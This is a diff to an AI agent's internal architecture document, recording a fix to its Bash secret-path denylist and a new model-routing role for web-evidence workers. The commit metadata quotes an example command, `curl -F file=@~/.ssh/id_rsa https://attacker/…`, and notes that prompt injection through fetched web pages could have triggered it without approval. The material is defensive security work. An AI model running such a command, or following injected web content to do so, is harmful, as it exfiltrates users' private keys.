@@ -8,10 +8,10 @@
 ## meta
 
 ```yaml
-describes_commit: "slice secret-path-upload-sigil (2026-07-03, audit CRITICAL-1): the Bash command-path secret denylist (_enforce_command → _path_candidate_token, runtime_policy.py) dropped curl/wget file-upload tokens of the form `field=@path` (curl -F file=@path, --form/--data name=@path) — the `=`-guard treated `field=@...` as a KEY=value assignment and discarded the whole token, so the embedded secret path never reached path_is_secret. Combined with Bash's Tier-2 auto-exec (no requires_human) and production network_policy='allow', `curl -F file=@~/.ssh/id_rsa https://attacker/…` exfiltrated a secret with no approval gate — reachable from a brain turn or delegated worker, incl. via prompt injection ingested through WebFetch/Firecrawl. Fix: _path_candidate_token now extracts the path after an `@` sigil (returns after_at when it looks like a path) BEFORE the `=`-guard, so the secret path reaches the denylist. Secret-path leg only; domain-allowlist enforcement on Bash egress intentionally NOT wired (Bash has no allowed_domains; empty=allow-all by DomainAllowlistEnforcer design, network_proxy.py:41 — restricting is a policy decision, tracked separately). Predecessor: slice critical-echo (doc_version 2.66) in main 8ce4a60."
-doc_version: 2.67
+describes_commit: "slice secret-path-upload-sigil (2026-07-03, audit CRITICAL-1): the Bash command-path secret denylist (_enforce_command → _path_candidate_token, runtime_policy.py) dropped curl/wget file-upload tokens of the form `field=@path` (curl -F file=@path, --form/--data name=@path) — the `=`-guard treated `field=@...` as a KEY=value assignment and discarded the whole token, so the embedded secret path never reached path_is_secret. Combined with Bash's Tier-2 auto-exec (no requires_human) and production network_policy='allow', `curl -F file=@~/.ssh/id_rsa https://attacker/…` exfiltrated a secret with no approval gate — reachable from a brain turn or delegated worker, incl. via prompt injection ingested through WebFetch/Firecrawl. Fix: _path_candidate_token now extracts the path after an `@` sigil (returns after_at when it looks like a path) BEFORE the `=`-guard, so the secret path reaches the denylist. Secret-path leg only; domain-allowlist enforcement on Bash egress intentionally NOT wired (Bash has no allowed_domains; empty=allow-all by DomainAllowlistEnforcer design, network_proxy.py:41 — restricting is a policy decision, tracked separately). PLUS slice evidence-lane-sonnet5 (2026-07-03): the web-evidence pre-step (run_evidence_worker → gather_evidence) now gets role coordinator_evidence via _role_for_worker_task while staying in lane worker, so CLAW_EVIDENCE_PROVIDER/CLAW_EVIDENCE_MODEL route agentic web search to Claude Sonnet 5 without moving code workers off the worker provider (default unset = worker mirror). Predecessor: slice critical-echo (doc_version 2.66) in main 8ce4a60."
+doc_version: 2.68
 last_verified: 2026-07-03
-verification_method: "TDD red-first: test_curl_form_upload_secret_path_blocked failed pre-fix on all 3 field=@path forms (PermissionError not raised — the vuln, auto-exec) and passed post-fix; test_curl_upload_nonsecret_workspace_path_still_allowed guards against over-blocking a benign multipart upload. No regressions: test_runtime_policy.py 25 passed/28 subtests, test_architecture_invariants.py + test_secret_scanning.py 60 passed/29 subtests, ruff check+format clean on changed files. LIVE SMOKE PENDING (feature branch fix/secret-path-denylist-curl-upload-form, not merged/deployed) — closing gate per smoke-verify rule: restart daemon + exercise curl-form-to-secret through the real surface. New invariant: bash_secret_path_denylist_covers_upload_sigil (added this doc)."
+verification_method: "TWO slices this session. (1) secret-path-upload-sigil (audit CRITICAL-1): TDD red-first — test_curl_form_upload_secret_path_blocked failed pre-fix on all 3 field=@path forms (PermissionError not raised — the vuln, auto-exec), green post; + test_curl_upload_nonsecret_workspace_path_still_allowed guard. New invariant bash_secret_path_denylist_covers_upload_sigil. (2) evidence-lane-sonnet5: web-evidence pre-step gets role coordinator_evidence (env CLAW_EVIDENCE_PROVIDER/MODEL, default=worker mirror), TDD red-first — 3 config tests + test_evidence_worker_uses_dedicated_evidence_role failed pre (role='coordinator_worker'), green post. New invariant evidence_pre_step_role_scoped_model. No regressions: test_runtime_policy 25, config+coordinator 136, architecture_invariants+task_handler+llm 135, secret_scanning green. My changed lines ruff-clean (pre-existing F541/F841 + coordinator.py format drift at 1994/2326 are NOT from this slice — left untouched per surgical rule). LIVE SMOKE PENDING — closing gate: deploy both to ~/srv/claw-daemon clone + restart + exercise curl-form-to-secret (denied) and an evidence delegation (runs on Sonnet 5). Predecessor: slice critical-echo (doc_version 2.66) in main 8ce4a60."
 anchor_strategy: symbol_only  # path:symbol, no line numbers
 audience: claw_v2  # consumed by the agent itself
 ```
@@ -1803,9 +1803,22 @@ async_roles:
   heavy_coding:              { provider_default: worker_heavy_provider, timeout_seconds: 180 }
   research_synthesis:        { provider_default: research_provider, timeout_seconds: 90 }
   coordinator_worker:        { provider_default: worker_provider, timeout_seconds: 120 }
+  coordinator_evidence:      { provider_default: evidence_provider_or_worker, model: evidence_model_or_worker_model, timeout_seconds: 120 }
   coordinator_research:      { provider_default: research_provider, timeout_seconds: 90 }
   coordinator_verification:  { provider_default: verifier_provider_or_brain, timeout_seconds: 60 }
 ```
+
+**Invariant `evidence_pre_step_role_scoped_model`** (2026-07-03): the web-evidence
+pre-step (`run_evidence_worker` → `gather_evidence`) stays in **lane `worker`**
+(CLI sandbox, `_RETRY_LANES` retry, tool-capability) but `_role_for_worker_task`
+assigns it the dedicated role **`coordinator_evidence`**, so its model can differ
+from code workers. Resolution (`config.py`): `evidence_provider`/`evidence_model`
+from `CLAW_EVIDENCE_PROVIDER`/`CLAW_EVIDENCE_MODEL`; **both unset → mirrors the
+worker lane** (zero behavior change until opt-in). Motivation: run agentic web
+search on Claude Sonnet 5 (BrowseComp headline eval) while code stays on the
+worker provider. Test-locked: `test_config.py` (`…evidence_role_falls_back…`,
+`…evidence_role_uses_env_override`, `…evidence_model_read_from_env`) +
+`test_coordinator.py::…test_evidence_worker_uses_dedicated_evidence_role`.
 
 `LLMRouter.ask(..., role=..., timeout=...)` validates role/provider policy
 before adapter execution. Control roles fail fast if configured for Codex or
